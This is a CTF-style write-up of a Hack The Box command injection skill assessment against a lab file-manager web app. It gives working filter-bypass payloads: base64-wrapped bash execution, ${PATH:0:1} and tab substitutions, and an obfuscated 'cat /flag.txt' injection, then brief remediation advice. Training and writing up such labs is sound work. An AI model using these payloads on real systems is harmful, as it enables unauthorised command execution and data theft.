This is a detailed write-up for the HTB Bug Bounty Hunter Certification’s skill assessments. This write-up series will treat each skill assessment as an individual penetration test, with a full explanation of a specific vulnerability, including remediation recommendations.
Command Injection Skill Assessment

Scenario:
You have been contracted to perform a penetration test for a company, and during your testing, you discover an interesting file manager web application. Since file managers often execute system commands, you are interested in testing for command injection vulnerabilities.

Use the various techniques discussed in this module to detect a command injection vulnerability and then exploit it, bypassing any filters that are in place.

Target in Scope:
94.237.xx.xxx
Recon and Analysis:

First, you want to interact with the application as a normal user to understand its functionality.

The file manager web application appears to be connected to the OS level, allowing us to view files hosted on the server.


When clicking the tmp folder, the parameter in the URL changes to to=tmp.

![1_sP63QruxRhfbTcO9YVNyXA](https://github.com/user-attachments/assets/59ef09be-f7b8-4d57-ae3a-62aecaf0b1a9)

This also happens when visiting a .txt file, with the parameter appearing as to=&view=filename.txt.

![1_J-RQt28WxAwk5Wa5-wT5CQ](https://github.com/user-attachments/assets/380f5e5b-af7d-4f72-b085-d875a704f593)

Each file and folder has several functional action buttons, such as the "copy" button.

![1_gjQ3JZfX-MGnxSe0qEu3pg](https://github.com/user-attachments/assets/7d2d989d-c1dc-40cd-80d5-59db260dfaf7)

It seems this function allows users to copy files to other directories.

![1_r5KkM70_NqJH2h7LhVrpQA](https://github.com/user-attachments/assets/daeecf1b-bf80-4078-a102-71ee641a2e89)

The file can be moved using this URL:

![1_rD7m-OmRqTgTcoTCIt09pw](https://github.com/user-attachments/assets/23ec78ec-92da-4abb-9928-638f6f414487)

Once a file is moved, the action cannot be repeated on the same file.

![1_qVTBRRDDLA6BJDUSu86tSw](https://github.com/user-attachments/assets/46c09bbc-c89c-4a1c-b950-2270bbf6c6a8)

There is also an advanced search option available next to the regular search bar.

![1_68X6VX6zfQBHoae9zy5QmA](https://github.com/user-attachments/assets/80acbefa-01e8-416c-9453-33fc2085bfd4)

![1_ZffheKduXtvwx1x9oT7tWQ](https://github.com/user-attachments/assets/0983529a-c562-45ef-bbb9-6791d4f1230d)
Attack Vector:

After testing the functional areas, we now want to target specific features and URL parameters to see if we can perform a command injection. One such area is the "move file" feature.

Below is the initial move of a file to a directory using the UI and HTTP request.

![1__9sjeuekvcmy2ap3PO5x6g](https://github.com/user-attachments/assets/94daae8f-ce9a-482b-9b92-6fbec09ea931)

![1_ncY80ky1RSacQ08pZvG0Ig](https://github.com/user-attachments/assets/2d8cddeb-4bb1-4720-a061-6bac9c63af17)
Below is the repeated action for moving the same file.

![1_tLiphvDYbtwb8ctXiJ4mcg](https://github.com/user-attachments/assets/cb117f97-8f43-4e5c-9bf3-dc0b14d97c06)

![1_Do-CEGUOvPj5x7fATCfogw](https://github.com/user-attachments/assets/3c20054b-0170-4ff5-a154-528f5eb36ddf)

We want to check if the URL parameter is vulnerable to command injection.
Command Injection Techniques:

To inject additional commands into the existing one, we can use the following operators:

![1_6RqtiecXLibfJG7bNnbggQ](https://github.com/user-attachments/assets/8e5a7ced-3d20-453b-9c21-9175d2e7fe26)

I tried injecting commands like whoami and ls into the "to" parameter. The error message displayed: "malicious request denied".

![1_AugDlPIamC-dViU1mxSZog](https://github.com/user-attachments/assets/1e147d29-cfdb-400e-9811-e61a98f5b7f0)

![1_6lfoA-aykZLJy4O0FylvfA](https://github.com/user-attachments/assets/82451731-5b66-4185-b145-1d53d404ac7b)

This indicates that basic commands are filtered. Therefore, we need to identify possible filters such as space, blacklisted characters, commands, or WAF filters.

To bypass this, I used command obfuscation with Base64 encoding.

bash<<<$(base64 -d<<<"base64 encoded OS payload")

![1_8qqHQ7Flk2Q_ta4Veh5TkA](https://github.com/user-attachments/assets/22448c0a-411a-44c7-8ff2-b9fac3dff2e9)

![1_VQa99McP4WKBTheG81c-Bg](https://github.com/user-attachments/assets/5b6d0267-d673-4229-b934-97ceb20e6007)

We successfully executed whoami and obtained the result: www-data. Next, I tested ls -la to list the files.

![1_1BxwIbTNtGgV_cLjJey8_w](https://github.com/user-attachments/assets/560881b1-453e-4746-b474-31e947411f67)

![1_y3D8SI-AzdRv-zy4NIqITA](https://github.com/user-attachments/assets/77d9db20-2325-4098-b28f-4ccd5ff13029)

Exploit:

Now that we’ve identified the attack vector by bypassing the filter, we can perform an exploit.

I attempted to view the root directory.

![1_71hBS1YyYI7UU1xOZqD4OQ](https://github.com/user-attachments/assets/e4370eb5-7f18-490b-a649-145ab6d6e897)

![1_W8IH38unw5sH16ApJBbReA](https://github.com/user-attachments/assets/cb53bf44-1a46-4127-b883-8a35560f28a5)


There are several files, including config.php and index.php. Let’s explore further.
![1_3ql0uD7UGvLZBFIr7WywkA](https://github.com/user-attachments/assets/5a87aea9-8c07-4c70-9c76-66608aca0ff1)

![1_-EU1o-wPNioFbl73qZCJ-w](https://github.com/user-attachments/assets/5bc27cde-d090-4c03-a593-a8dddc535e2d)

![1_cgdw9PtRxdIlbW2j1KB2lw](https://github.com/user-attachments/assets/b144ef9c-9cfb-4b82-b26f-096e92090e35)


I couldn’t find the target file, flag.txt, but I moved it to the tmp directory.

${PATH:0:1} = /

${IFS} = space

mv/flag.txt /var/www/html/files/tmp

mv ${PATH:0:1}flag.txt ${PATH:0:1}var${PATH:0:1}www${PATH:0:1}html${PATH:0:1}files${PATH:0:1}tmp

Base64 encoded:

bXYgJHtQQVRIOjA6MX1mbGFnLnR4dCAke1BBVEg6MDoxfXZhciR7UEFUSDowOjF9d3d3JHtQQVRIOjA6MX1odG1sJHtQQVRIOjA6MX1maWxlcyR7UEFUSDowOjF9dG1w

bash<<<$(base64%09-d<<<bXYgJHtQQVRIOjA6MX1mbGFnLnR4dCAke1BBVEg6MDoxfXZhciR7UEFUSDowOjF9d3d3JHtQQVRIOjA6MX1odG1sJHtQQVRIOjA6MX1maWxlcyR7UEFUSDowOjF9dG1w)

![1_3xa5s3hlJbbor7gk6IkI1A](https://github.com/user-attachments/assets/ae2ed837-0694-4b6f-8d3e-c9d75efe5024)

While the file was moved, I didn’t have permission to read it. However, I now know the location of the flag.txt file.

To bypass character filters, I used this payload:

%26c\a\t%09${PATH:0:1}flag.txt

&cat (horizontal tab) /flag.txt

![1_Uhd2OU1u7YJIZ6tpFZBHrA](https://github.com/user-attachments/assets/75d45b6a-43a2-4fba-b380-b1e4c7b0ae99)
Consequences:

A command injection vulnerability is one of the most severe types. It allows an attacker to execute OS-level commands on the server, potentially compromising the entire network. When a web application uses user input to execute a system command, an attacker can inject malicious commands and take control of the system.

Remediation:

To prevent command injection vulnerabilities, consider the following measures:

    Avoid using system commands in web applications.
    Implement strict input validation and sanitization.
    Configure the web server properly to minimize the risk of such attacks.
